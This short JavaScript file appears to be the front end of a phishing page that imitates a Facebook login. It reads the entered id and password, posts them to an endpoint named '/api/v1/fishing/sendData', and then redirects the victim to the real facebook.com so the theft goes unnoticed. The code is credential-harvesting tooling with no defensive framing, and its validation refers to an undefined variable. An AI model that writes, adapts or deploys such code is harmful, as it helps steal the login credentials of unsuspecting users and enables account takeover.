async function sendData(id,password){
    const url="/api/v1/fishing/sendData";
    let result= await fetch(url,{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify({id,password})
    })
    let data=await result.json();
if(data.sucess===true){
    window.location.href="https://facebook.com"
}
}

function validate(){
    const id=document.getElementsByClassName("id")[0].value
    const password=document.getElementsByClassName("password")[0].value

    let validateEmailOrNumber=/^([a-zA-Z0-9\._]+)@([a-zA-Z0-9]+)\.([a-zA-Z]+)$/.test(id) || /[0-9]{8}/.test(id);
    
    if(validateEmailOrNumber || validatePassword.length>7){
        sendData(id,password);
    }
}